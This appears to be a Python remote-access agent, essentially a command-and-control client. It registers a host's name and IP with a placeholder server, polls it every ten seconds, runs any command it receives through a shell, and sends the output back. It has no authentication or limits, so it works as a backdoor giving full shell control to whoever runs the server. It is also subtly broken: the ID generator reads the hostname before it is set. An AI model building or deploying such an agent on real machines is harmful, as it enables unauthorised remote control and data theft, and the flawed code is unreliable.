import requests
import time
import json
import platform
import socket
import subprocess

class Agent:
    def __init__(self, server_url, agent_id=None):
        self.server_url = server_url
        self.agent_id = agent_id or self.generate_id()
        self.hostname = platform.node()
        self.ip_address = socket.gethostbyname(socket.gethostname())
    
    def generate_id(self):
        return f"{self.hostname}-{int(time.time())}"
    
    def register(self):
        data = {
            'agent_id': self.agent_id,
            'hostname': self.hostname,
            'ip_address': self.ip_address
        }
        try:
            response = requests.post(f"{self.server_url}/register", json=data)
            return response.status_code == 200
        except:
            return False
    
    def get_task(self):
        try:
            response = requests.get(f"{self.server_url}/task/{self.agent_id}")
            if response.status_code == 200:
                return response.json().get('task')
        except:
            return None
        return None
    
    def execute_task(self, task):
        try:
            if task['type'] == 'command':
                result = subprocess.run(task['command'], shell=True, 
                                      capture_output=True, text=True)
                return {
                    'output': result.stdout,
                    'error': result.stderr,
                    'returncode': result.returncode
                }
        except Exception as e:
            return {'error': str(e)}
    
    def run(self):
        self.register()
        while True:
            task = self.get_task()
            if task:
                result = self.execute_task(task)
                # Send result back to server
                try:
                    requests.post(f"{self.server_url}/result/{self.agent_id}", json=result)
                except:
                    pass
            time.sleep(10)  # Check for tasks every 10 seconds

if __name__ == '__main__':
    agent = Agent("http://your-server-ip:5000")
    agent.run()
